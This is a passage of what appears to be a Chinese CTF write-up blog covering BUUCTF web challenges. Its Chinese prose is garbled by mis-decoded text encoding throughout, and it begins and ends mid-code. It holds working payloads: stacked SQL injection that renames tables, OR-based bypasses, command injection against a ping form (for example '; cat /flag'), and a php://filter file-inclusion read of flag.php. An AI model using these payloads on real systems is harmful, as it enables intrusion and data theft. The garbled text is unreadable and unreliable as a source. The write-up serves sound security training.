)ã€Šæ­¤å¤„ä¹Ÿå¯ä»¥çœ‹å‡ºï¼Œäººå®¶ç»™çš„ç¬¬äºŒä¸ªé»˜è®¤æŸ¥è¯¢è¡¨wordså¹¶ä¸æ˜¯æ²¡ç”¨çš„ï¼ˆéœ€è¦çŸ¥é“å®ƒå†…éƒ¨çš„åå­—ï¼‰ã€‹<br>ä»–æ—¢ç„¶æ²¡è¿‡æ»¤ alert å’Œ renameï¼Œé‚£ä¹ˆæˆ‘ä»¬æ˜¯ä¸æ˜¯å¯ä»¥æŠŠè¡¨æ”¹ä¸ªåå­—ï¼Œå†ç»™åˆ—æ”¹ä¸ªåå­—å‘¢</p></blockquote><h2 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h2><blockquote><p><code>/?inject=1&#39;;RENAME TABLE </code>words<code>TO</code>words1<code>;RENAME TABLE </code>1919810931114514<code>TO</code>words<code>;ALTER TABLE </code>words<code>CHANGE</code>flag<code> </code>id<code> VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</code></p><p>æ”¹å®Œåï¼Œé»˜è®¤æŸ¥è¯¢id=1ï¼Œå°±å¯ä»¥æŸ¥åˆ°äº†</p></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">payload:<span class="token number">1</span><span class="token string">' or 1 ='</span><span class="token number">1</span><span class="token comment">#</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h1 id="5ã€-ACTF2020-æ–°ç”Ÿèµ›-Exec"><a href="#5ã€-ACTF2020-æ–°ç”Ÿèµ›-Exec" class="headerlink" title="5ã€[ACTF2020 æ–°ç”Ÿèµ›]Exec"></a>5ã€[ACTF2020 æ–°ç”Ÿèµ›]Exec</h1><p><em><strong><u>ç»™äº†ä¸€ä¸ªpingçš„è¾“å…¥æ¡†</u></strong></em></p><blockquote><p>phpæ¨¡æ‹Ÿæˆ‘ä»¬å¸¸ç”¨çš„DOSå‘½ä»¤çš„pingå‘½ä»¤æ–¹æ³•ï¼Œä¸»è¦ç”¨åˆ°çš„æ˜¯phpçš„**<u>å†…ç½®å‡½æ•°</u>**execæ¥è°ƒç”¨ç³»ç»Ÿçš„pingå‘½ä»¤,ä»è€Œå®ç°pingå‘½ä»¤åŠŸèƒ½ã€‚ </p><p>ä»è€Œæƒ³åˆ°é€šè¿‡execå‡½æ•°æ¥è¿›è¡ŒRCEã€‚ </p></blockquote><h2 id="çŸ¥è¯†ç‚¹ï¼š"><a href="#çŸ¥è¯†ç‚¹ï¼š" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a><code>çŸ¥è¯†ç‚¹ï¼š</code></h2><p><code>æ³¨æ„ä½¿ç”¨execå‡½æ•°å¿…é¡»éœ€è¦æœåŠ¡å™¨æ”¯æŒè°ƒç”¨ç³»ç»Ÿå†…ç½®å‡½æ•°æ‰è¡Œã€‚å¦å¤–ä¹Ÿå¯ä»¥ä½¿ç”¨systemç­‰phpå†…ç½®å‡½æ•°æ¥å®ç°è¿™ä¸ªåŠŸèƒ½</code></p><p><code>execæ‰§è¡Œä¸€ä¸ªå¤–éƒ¨ç¨‹åº</code></p><p><code>æ‰§è¡Œç»™äºˆçš„å‘½ä»¤commandï¼Œä¸è¿‡å®ƒå¹¶ä¸ä¼šè¾“å‡ºä»»ä½•ä¸œè¥¿ï¼Œå®ƒç®€å•çš„ä»å‘½ä»¤çš„ç»“æœä¸­ä¼ å›æœ€åä¸€è¡Œï¼Œå¦‚æœä½ éœ€è¦å»æ‰§è¡Œä¸€ä¸ªå‘½ä»¤ï¼Œå¹¶ä¸”ä»å‘½ä»¤å»å–å¾—æ‰€æœ‰èµ„æ–™æ—¶ï¼Œå¯ä»¥ä½¿ç”¨passthru()è¿™ä¸ªå‡½æ•°ã€‚</code></p><p><code>system---æ‰§è¡Œå¤–éƒ¨ç¨‹å¼å¹¶ä¸”æ˜¾ç¤ºè¾“å‡º</code></p><p><code>system()æ‰§è¡Œç»™äºˆçš„å‘½ä»¤commandï¼Œå¹¶ä¸”è¾“å‡ºç»“æœã€‚å¦‚æœæœ‰ç»™äºˆå‚æ•°return_varï¼Œåˆ™æ‰§è¡Œå‘½ä»¤çš„çŠ¶æ€ç å°†ä¼šå†™åˆ°è¿™ä¸ªå˜é‡ã€‚</code></p><p><code>æ³¨æ„:å¦‚æœä½ å…è®¸æ¥è‡ªä½¿ç”¨è€…è¾“å…¥çš„èµ„æ–™ï¼Œå¯ä»¥ä¼ é€’åˆ°æ­¤å‡½æ•°ï¼Œé‚£ä¹ˆä½ åº”è¯¥ä½¿ç”¨escapeshellcmd()æ¥ç¡®å®šæ­¤ä½¿ç”¨è€…æ— æ³•å“„éª—(trick)ç³»ç»Ÿæ¥æ‰§è¡Œæ­¦æ–­çš„(arbitrary)å‘½ä»¤ã€‚</code></p><p><code>æ³¨æ„:å¦‚æœä½ ä½¿ç”¨æ­¤å‡½æ•°æ¥å¯åŠ¨ä¸€ä¸ªç¨‹å¼ï¼Œè€Œä¸”å¸Œæœ›åœ¨èƒŒæ™¯é‡Œ(background)æ‰§è¡Œçš„æ—¶å€™ç¦»å¼€å®ƒï¼Œä½ å¿…é¡»ç¡®å®šæ­¤ç¨‹å¼çš„è¾“å‡ºæ˜¯è½¬å‘(redirected)åˆ°ä¸€ä¸ªæ–‡ä»¶æˆ–æ˜¯ä¸€äº›è¾“å‡ºçš„èµ„æ–™æµï¼Œå¦åˆ™PHPå°†ä¼šæ‚¬æŒ‚(hang)ç›´åˆ°ç¨‹å¼æ‰§è¡Œç»“æŸã€‚</code></p><h2 id="ä½¿ç”¨æ–¹æ³•"><a href="#ä½¿ç”¨æ–¹æ³•" class="headerlink" title="ä½¿ç”¨æ–¹æ³•"></a>ä½¿ç”¨æ–¹æ³•</h2><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini"><span class="token comment">;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡</span>|ç›´æ¥æ‰§è¡Œåé¢çš„è¯­å¥||å¦‚æœå‰é¢å‘½ä»¤æ˜¯é”™çš„é‚£ä¹ˆå°±æ‰§è¡Œåé¢çš„è¯­å¥ï¼Œå¦åˆ™åªæ‰§è¡Œå‰é¢çš„è¯­å¥&amp;å‰é¢å’Œåé¢å‘½ä»¤éƒ½è¦æ‰§è¡Œï¼Œæ— è®ºå‰é¢çœŸå‡&amp;&amp;å¦‚æœå‰é¢ä¸ºå‡ï¼Œåé¢çš„å‘½ä»¤ä¹Ÿä¸æ‰§è¡Œï¼Œå¦‚æœå‰é¢ä¸ºçœŸåˆ™æ‰§è¡Œä¸¤æ¡å‘½ä»¤<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="payload-1"><a href="#payload-1" class="headerlink" title="payload"></a>payload</h2><pre class="line-numbers language-ini" data-language="ini"><code class="language-ini">aaa ; cat /flag(cat flagé”™è¯¯ï¼ŒçŒœæµ‹ï¼š/å¯èƒ½æ˜¯æŸ¥æ‰¾æ‰€æœ‰ç›®å½•ä¸‹çš„flag)aaa | cat /flagaaa ||cat /flagaaa &amp; cat /flag127.0.0.1 &amp;&amp; cat /flag(æ‰§è¡Œæ— flag)<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><a href="https://blog.csdn.net/qq_46918279/article/details/120243396?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522165128968616782184694889%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&request_id=165128968616782184694889&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-2-120243396.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BACTF2020+%E6%96%B0%E7%94%9F%E8%B5%9B%5DExec+1&spm=1018.2226.3001.4187">å‚è€ƒ</a></p><p><a href="https://www.cnblogs.com/nerrissa/articles/4929462.html">phpå‘½ä»¤exec</a></p><h1 id="6ã€-SUCTF-2019-EasySQL"><a href="#6ã€-SUCTF-2019-EasySQL" class="headerlink" title="6ã€[SUCTF 2019]EasySQL"></a>6ã€[SUCTF 2019]EasySQL</h1><h2 id="çŸ¥è¯†ç‚¹ï¼š-1"><a href="#çŸ¥è¯†ç‚¹ï¼š-1" class="headerlink" title="çŸ¥è¯†ç‚¹ï¼š"></a>çŸ¥è¯†ç‚¹ï¼š</h2><p><a href="https://www.php.cn/php-weizijiaocheng-254981.html">PHPçŸ­è·¯è¿ç®—ç¬¦</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">echo</span> <span class="token string double-quoted-string">"å›½å£«æ— åŒï¼Œæ‚¨ä¸€è·¯èµ°å¥½ï¼Œåšä¿¡æœªæ¥ä¹Ÿä¸€å®šæ»¡æ˜¯èµ¤æ——çš„ä¸–ç•Œ"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">;</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">5</span><span class="token punctuation">;</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">20</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token number">10</span> <span class="token operator">||</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>   <span class="token comment">//è½¬æ¢ç±»å‹ä¸ºboolå‹ï¼Œa=1ï¼Œbè¢«çŸ­è·¯</span>    <span class="token variable">$a</span><span class="token operator">++</span><span class="token punctuation">;</span> <span class="token comment">//boolä¸å‚ä¸æ•°å€¼è¿ç®—</span>    <span class="token variable">$b</span><span class="token operator">++</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">echo</span> <span class="token variable">$a</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"\n"</span><span class="token punctuation">,</span><span class="token string double-quoted-string">""</span><span class="token punctuation">,</span><span class="token variable">$b</span><span class="token punctuation">;</span> <span class="token comment">//1 21</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="å‚è€ƒï¼š"><a href="#å‚è€ƒï¼š" class="headerlink" title="å‚è€ƒï¼š"></a>å‚è€ƒï¼š</h3><p><a href="https://blog.csdn.net/u014029795/article/details/105241226?ops_request_misc=%7B%22request_id%22:%22165130361716782390589859%22,%22scm%22:%2220140713.130102334.pc_all.%22%7D&request_id=165130361716782390589859&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-105241226.142%5Ev9%5Epc_search_result_cache,157%5Ev4%5Enew_style&utm_term=%5BSUCTF+2019%5DEasySQL+1&spm=1018.2226.3001.4187"> åŠ æ·±ç†è§£</a></p><p><a href="https://blog.csdn.net/StevenOnesir/article/details/110203051?spm=1001.2101.3001.6661.1&utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~default-1.pc_relevant_default&utm_relevant_index=1">é«˜çº§æ€è·¯æ‰“å‡»</a></p><h2 id="å¤§è‡´æ€è·¯ï¼š"><a href="#å¤§è‡´æ€è·¯ï¼š" class="headerlink" title="å¤§è‡´æ€è·¯ï¼š"></a>å¤§è‡´æ€è·¯ï¼š</h2><h3 id="ç¬¬ä¸€ç§ï¼šæ‰‹å·¥ç›²æ³¨"><a href="#ç¬¬ä¸€ç§ï¼šæ‰‹å·¥ç›²æ³¨" class="headerlink" title="ç¬¬ä¸€ç§ï¼šæ‰‹å·¥ç›²æ³¨"></a>ç¬¬ä¸€ç§ï¼šæ‰‹å·¥ç›²æ³¨</h3><blockquote><p>ä»–çš„åç«¯æ—¢ç„¶èƒ½åšåˆ°<strong>æ•°å­—å›æ˜¾</strong>==<u><strong>å­—æ¯ä¸å›æ˜¾</strong></u>==ï¼Œè¯´æ˜æœ‰ä¸€ä¸ª ==æˆ–== ç»“æ„ï¼Œè€Œä¸”ä¸ç›´æ¥å›æ˜¾flagï¼Œä½†ä½œä¸ºä¸€é“é¢˜ç›®ï¼Œfromä¸€å®šæ˜¯from flagã€‚<br>æ‰€ä»¥çŒœæµ‹åç«¯ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token class-name type-declaration">select</span> <span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'query'</span><span class="token punctuation">]</span> <span class="token operator">||</span> <span class="token class-name">flag</span> from flag<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>ç»“åˆï¼š</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token number">1</span> <span class="token keyword">from</span> test<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">---+</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---+</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span> <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">---+</span><span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> a <span class="token keyword">from</span> test<span class="token punctuation">;</span>ERROR <span class="token number">1054</span> <span class="token punctuation">(</span><span class="token number">42</span>S22<span class="token punctuation">)</span>: Unknown <span class="token keyword">column</span> <span class="token string">'a'</span> <span class="token operator">in</span> <span class="token string">'field list'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ•°å­—å¯ä»¥å›æ˜¾ï¼Œå­—æ¯ä¸å¯ä»¥</p></blockquote><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token number">1</span><span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span><span class="token operator">+</span><span class="token comment">------+</span><span class="token operator">|</span> <span class="token number">1</span><span class="token operator">|</span>id <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">------+</span><span class="token operator">|</span>    <span class="token number">1</span> <span class="token operator">|</span><span class="token operator">|</span>    <span class="token number">3</span> <span class="token operator">|</span><span class="token operator">+</span><span class="token comment">------+</span><span class="token number">2</span> <span class="token keyword">rows</span> <span class="token operator">in</span> <span class="token keyword">set</span> <span class="token punctuation">(</span><span class="token number">0.00</span> sec<span class="token punctuation">)</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> a<span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span>ERROR <span class="token number">1054</span> <span class="token punctuation">(</span><span class="token number">42</span>S22<span class="token punctuation">)</span>: Unknown <span class="token keyword">column</span> <span class="token string">'a'</span> <span class="token operator">in</span> <span class="token string">'field list'</span>mysql<span class="token operator">></span> <span class="token keyword">select</span> <span class="token operator">*</span><span class="token operator">|</span>id <span class="token keyword">from</span> test<span class="token punctuation">;</span>ERROR <span class="token number">1064</span> <span class="token punctuation">(</span><span class="token number">42000</span><span class="token punctuation">)</span>: You have an error <span class="token operator">in</span> your <span class="token keyword">SQL</span> syntax<span class="token punctuation">;</span> <span class="token keyword">check</span> the manual that corresponds <span class="token keyword">to</span> your MySQL server version <span class="token keyword">for</span> the <span class="token keyword">right</span> syntax <span class="token keyword">to</span> <span class="token keyword">use</span> near <span class="token string">'|id from test'</span> at line <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>å­—æ¯å­—ç¬¦å‡ä¸å¯ä»¥</p></blockquote><h4 id="payloadï¼š"><a href="#payloadï¼š" class="headerlink" title="payloadï¼š"></a>payloadï¼š</h4><p><code>*,1</code></p><p>ç›¸å½“äº</p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token number">1</span><span class="token punctuation">,</span>flag <span class="token keyword">from</span> Flag<span class="token keyword">select</span> <span class="token operator">*</span><span class="token punctuation">,</span><span class="token number">1</span> <span class="token keyword">from</span> Flagè¯­å¥å«ä¹‰ï¼šä»Flagè¡¨ä¸­ï¼ŒæŸ¥è¯¢æ‰€æœ‰å­—æ®µï¼Œä»¥åŠå°†æœ€åä¸€ä¸ªå­—æ®µå€¼æ˜¾ç¤ºä¸º<span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ç¬¬äºŒç§ï¼šå †å æ³¨å…¥"><a href="#ç¬¬äºŒç§ï¼šå †å æ³¨å…¥" class="headerlink" title="ç¬¬äºŒç§ï¼šå †å æ³¨å…¥"></a>ç¬¬äºŒç§ï¼š<strong>å †å æ³¨å…¥</strong></h3><h4 id="payload-2"><a href="#payload-2" class="headerlink" title="payload:"></a>payload:</h4><p><code>1;set sql_mode=pipes_as_concat;select 1</code></p><p>çœ‹ä¸€ä¸ª<code>writeup</code>ä¸Šè¯´ï¼Œç¬¬ä¸€ç§è§£æ³•æ˜¯éé¢„æœŸè§£ï¼Œé¢„æœŸè§£åº”è¯¥æ˜¯<code>1;set sql_mode=PIPES_AS_CONCAT;select 1</code>ã€‚<br>å¬éƒ½æ²¡å¬è¿‡ï¼Œå»æŸ¥äº†ä¸‹<code>set sql_mode=PIPES_AS_CONCAT</code>ï¼Œç”¨æ¥å¤„ç†<code>|</code>çš„ç¬¦å·çš„ï¼Œå°†<code>æˆ–</code>æ“ä½œæ”¹æˆ<code>è¿æ¥</code>æ“ä½œã€‚</p><h1 id="7ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File1"><a href="#7ã€-æå®¢å¤§æŒ‘æˆ˜-2019-Secret-File1" class="headerlink" title="7ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File1"></a>7ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Secret File1</h1><h2 id="é¢˜ç›®ç¯å¢ƒï¼š"><a href="#é¢˜ç›®ç¯å¢ƒï¼š" class="headerlink" title="é¢˜ç›®ç¯å¢ƒï¼š"></a>é¢˜ç›®ç¯å¢ƒï¼š</h2><blockquote><h1 id="ä½ æƒ³çŸ¥é“è’‹ç’æºçš„ç§˜å¯†ä¹ˆï¼Ÿ"><a href="#ä½ æƒ³çŸ¥é“è’‹ç’æºçš„ç§˜å¯†ä¹ˆï¼Ÿ" class="headerlink" title="ä½ æƒ³çŸ¥é“è’‹ç’æºçš„ç§˜å¯†ä¹ˆï¼Ÿ"></a>ä½ æƒ³çŸ¥é“è’‹ç’æºçš„ç§˜å¯†ä¹ˆï¼Ÿ</h1><p>æƒ³è¦çš„è¯å¯ä»¥ç»™ä½ ï¼Œå»æ‰¾å§ï¼æŠŠä¸€åˆ‡éƒ½æ”¾åœ¨é‚£é‡Œäº†ï¼</p></blockquote><p>F12çœ‹æºç </p><blockquote><p><code>href=&quot;./Archive_room.php&quot;</code></p></blockquote><p>å»çœ‹çœ‹</p><blockquote><h1 id="æˆ‘æŠŠä»–ä»¬éƒ½æ”¾åœ¨è¿™é‡Œäº†ï¼Œå»çœ‹çœ‹å§"><a href="#æˆ‘æŠŠä»–ä»¬éƒ½æ”¾åœ¨è¿™é‡Œäº†ï¼Œå»çœ‹çœ‹å§" class="headerlink" title="æˆ‘æŠŠä»–ä»¬éƒ½æ”¾åœ¨è¿™é‡Œäº†ï¼Œå»çœ‹çœ‹å§"></a>æˆ‘æŠŠä»–ä»¬éƒ½æ”¾åœ¨è¿™é‡Œäº†ï¼Œå»çœ‹çœ‹å§</h1><p><a href="http://b3d20ddb-6910-453b-9b82-04aa6ecfc653.node4.buuoj.cn:81/action.php">             SECRET         </a></p><p>Syclover @ cl4y</p></blockquote><blockquote><h1 id="æŸ¥é˜…ç»“æŸ"><a href="#æŸ¥é˜…ç»“æŸ" class="headerlink" title="æŸ¥é˜…ç»“æŸ"></a>æŸ¥é˜…ç»“æŸ</h1><p>æ²¡çœ‹æ¸…ä¹ˆï¼Ÿå›å»å†ä»”ç»†çœ‹çœ‹å§ã€‚</p><p>Syclover @ cl4y</p></blockquote><p>å•¥ä¹Ÿæ²¡æœ‰ï¼Œâ€”â€”&gt;é¡µé¢æ˜¯ç›´æ¥è·³è½¬çš„</p><h2 id="bpæŠ“åŒ…"><a href="#bpæŠ“åŒ…" class="headerlink" title="bpæŠ“åŒ…"></a>bpæŠ“åŒ…</h2><p>è¿”å›å¤´ä¸­ï¼š</p><pre class="line-numbers language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span><span class="token comment">&lt;!--   secr3t.php        --></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç»§ç»­æŸ¥çœ‹</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span>secret<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">charset</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>UTF-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>    <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token variable">$file</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">strstr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"../"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span> <span class="token string double-quoted-string">"tp"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"input"</span><span class="token punctuation">)</span><span class="token operator">||</span><span class="token class-name">stristr</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">,</span><span class="token string double-quoted-string">"data"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string double-quoted-string">"Oh no!"</span><span class="token punctuation">;</span>        <span class="token keyword">exit</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    <span class="token keyword">include</span><span class="token punctuation">(</span><span class="token variable">$file</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">//flagæ”¾åœ¨äº†flag.phpé‡Œ</span><span class="token delimiter important">?></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="å°è¯•ä¼ å‚ï¼š"><a href="#å°è¯•ä¼ å‚ï¼š" class="headerlink" title="å°è¯•ä¼ å‚ï¼š"></a>å°è¯•ä¼ å‚ï¼š</h2><p><code>?file=flag.php</code></p><p>é¡µé¢é™¤äº†èƒŒæ™¯å˜é»‘æ²¡å˜åŒ–ï¼ŒF12ä¸­åœ¨styleä¸­èƒŒæ™¯æ”¹ä¸ºç™½è‰²ï¼Œæ— </p><p>æºç ä¸­è¿‡æ»¤äº†ä¸€äº›å…³é”®å­—</p><h2 id="å°è¯•ä½¿ç”¨filterè¿‡æ»¤å™¨"><a href="#å°è¯•ä½¿ç”¨filterè¿‡æ»¤å™¨" class="headerlink" title="å°è¯•ä½¿ç”¨filterè¿‡æ»¤å™¨"></a>å°è¯•ä½¿ç”¨filterè¿‡æ»¤å™¨</h2><pre class="line-numbers language-none"><code class="language-none">?file&#x3D;php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;flag.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿›è¡Œbase64è½¬ç åå¾—åˆ°flag</p><h2 id="GXYCTF2019-Ping-Ping-Ping1"><a href="#GXYCTF2019-Ping-Ping-Ping1" class="headerlink" title="[GXYCTF2019]Ping Ping Ping1"></a>[GXYCTF2019]Ping Ping Ping1</h2><p>ç¯å¢ƒæè¿°ï¼š</p><blockquote><p>/?ip=</p></blockquote><p>pingä¸€ä¸‹æœ¬æœºï¼š<code>ping 127.0.0.1</code></p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytes<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre></blockquote><p>ç»§ç»­ï¼š<code>ping 127.0.0.1;ls;</code></p><blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token constant">PING</span> <span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span> <span class="token punctuation">(</span><span class="token number">127.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytesflag<span class="token operator">.</span>phpindex<span class="token operator">.</span>php<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre></blockquote><p><code>ping 127.0.0.1;ls;cat flag.php</code></p><blockquote><p>/?ip= fxck your space!</p></blockquote><p>?????èŠ±é‡Œèƒ¡å“¨</p><p>ç»å°è¯•ï¼Œè¿‡æ»¤äº†ç©ºæ ¼</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token constant">PING</span> <span class="token number">1</span> <span class="token punctuation">(</span><span class="token number">0.0</span><span class="token number">.0</span><span class="token number">.1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token number">56</span> data bytesflag<span class="token operator">.</span>phpindex<span class="token operator">.</span>php<span class="token operator">/</span><span class="token operator">?</span>ip<span class="token operator">=</span><span class="token operator">|</span>\'<span class="token operator">|</span>\<span class="token string double-quoted-string">"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\>|\'|\"|\\|\(|\)|\[|\]|\&#123;|\&#125;/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">,</span> <span class="token variable">$match</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your symbol!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/ /"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your space!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"/bash/"</span><span class="token punctuation">,</span> <span class="token variable">$ip</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"fxck your bash!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string 